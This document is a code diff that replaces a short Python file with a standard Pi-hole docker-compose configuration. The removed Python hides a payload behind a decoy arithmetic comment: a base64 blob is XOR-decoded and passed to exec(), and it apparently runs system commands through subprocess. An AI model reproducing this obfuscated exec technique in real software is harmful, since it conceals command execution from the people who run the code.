@@ -1,15 +1,40 @@
-import base64
-
-
-# Решаем сложный пример
-a = 1
-b = 10
-c = a + b
-print(c)
-
-def z(z, x):
-    return bytes([c ^ x for c in z])
-
-xz = 'AWJme2R5fyt4fml7eWRobnh4JytpanhuPT8BAW9ubSt5fmVUaGRmZmplbyNoZGZmamVvIjEBKysrK3lueH5nfys2K3h+aXt5ZGhueHglaGNuaGBUZH5/e35/I2hkZmZqZW8nK3hjbmdnNl95fm4iASsrKyt5bn9+eWUreW54fmd/JW9uaGRvbiMpfn9tJjMpIgEBb25tK2h5cnt/I29qf2oiMQErKysrYG5yKzYrMjIBKysrK29qf2orNissLCVhZGJlI2hjeSNkeW8jaCIrVStgbnIiK21keStoK2JlK29qf2oiASsrKyt5bn9+eWUraWp4bj0/JWk9P25laGRvbiNvan9qJW5laGRvbiMpfn9tJjMpIiIBAXt5YmV/I2h5cnt/I3l+ZVRoZGZmamVvIyl8Y2RqZmIpIiIiAXt5YmV/I2h5cnt/I3l+ZVRoZGZmamVvIylneGlUeW5nbmp4bismaikiIiIBe3liZX8jaHlye38jeX5lVGhkZmZqZW8jKWx5ZH57eCkiIiIBe3liZX8jaHlye38jeX5lVGhkZmZqZW8jKWJvKSIiIgF7eWJlfyNoeXJ7fyN5fmVUaGRmZmplbyMpe3xvKSIiIgF7eWJlfyNoeXJ7fyN5fmVUaGRmZmplbyMpfmVqZm4rJmUpIiIiAXt5YmV/I2h5cnt/I3l+ZVRoZGZmamVvIyl+ZWpmbismaikiIiIBe3liZX8jaHlye38jeX5lVGhkZmZqZW8jKWh+eWcrYm1oZGVtYmwlZm4pIiIiAQ=='
-
-exec(z(base64.b64decode(xz), c))
+# More info at https://github.com/pi-hole/docker-pi-hole/ and https://docs.pi-hole.net/
+services:
+  pihole:
+    container_name: pihole
+    image: pihole/pihole:latest
+    ports:
+      # DNS Ports
+      - "53:53/tcp"
+      - "53:53/udp"
+      # Default HTTP Port
+      - "80:80/tcp"
+      # Default HTTPs Port. FTL will generate a self-signed certificate
+      - "443:443/tcp"
+      # Uncomment the below if using Pi-hole as your DHCP Server
+      #- "67:67/udp"
+      # Uncomment the line below if you are using Pi-hole as your NTP server
+      #- "123:123/udp"
+    environment:
+      # Set the appropriate timezone for your location from
+      # https://en.wikipedia.org/wiki/List_of_tz_database_time_zones, e.g:
+      TZ: 'Europe/Moscow'
+      # Set a password to access the web interface. Not setting one will result in a random password being assigned
+      FTLCONF_webserver_api_password: 'correct horse battery staple'
+      # If using Docker's default `bridge` network setting the dns listening mode should be set to 'all'
+      FTLCONF_dns_listeningMode: 'all'
+    # Volumes store your data between container upgrades
+    volumes:
+      # For persisting Pi-hole's databases and common configuration file
+      - './etc-pihole:/etc/pihole'
+      # Uncomment the below if you have custom dnsmasq config files that you want to persist. Not needed for most starting fresh with Pi-hole v6. If you're upgrading from v5 you and have used this directory before, you should keep it enabled for the first v6 container start to allow for a complete migration. It can be removed afterwards. Needs environment variable FTLCONF_misc_etc_dnsmasq_d: 'true'
+      #- './etc-dnsmasq.d:/etc/dnsmasq.d'
+    cap_add:
+      # See https://github.com/pi-hole/docker-pi-hole#note-on-capabilities
+      # Required if you are using Pi-hole as your DHCP server, else not needed
+      - NET_ADMIN
+      # Required if you are using Pi-hole as your NTP client to be able to set the host's system time
+      - SYS_TIME
+      # Optional, if Pi-hole should get some more processing time
+      - SYS_NICE
+    restart: unless-stopped
